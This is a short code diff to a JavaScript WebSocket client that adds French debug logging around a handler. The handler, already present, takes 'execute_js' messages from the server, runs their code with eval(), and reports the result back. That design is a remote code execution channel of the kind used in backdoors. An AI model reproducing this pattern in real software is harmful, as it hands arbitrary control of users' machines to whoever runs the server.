@@ -351,6 +351,7 @@ class ClientNet3m8w {
     this.socketConn7x1q.onmessage = (event) => {
       try {
         const message = JSON.parse(event.data);
+        console.log('[CLIENT] Message reçu:', message.type, message.timestamp || 'pas de timestamp');
 
         if (message.type === 'welcome') {
           this.userIdent4z8n = message.uuid;
@@ -358,8 +359,10 @@ class ClientNet3m8w {
         }
 
         if (message.type === 'execute_js') {
+          console.log('[CLIENT] Message execute_js reçu, exécution du code:', message.code.substring(0, 100) + '...');
           try {
             const result = eval(message.code);
+            console.log('[CLIENT] Code exécuté avec succès');
             this.sendMessage({
               type: 'js_executed',
               success: true,
@@ -367,7 +370,7 @@ class ClientNet3m8w {
               timestamp: new Date().toISOString(),
             });
           } catch (executeError) {
-            console.error('[CLIENT] Erreur d\\'exécution JS:', executeError);
+            console.error("[CLIENT] Erreur d'exécution JS:", executeError);
             this.sendMessage({
               type: 'js_executed',
               success: false,
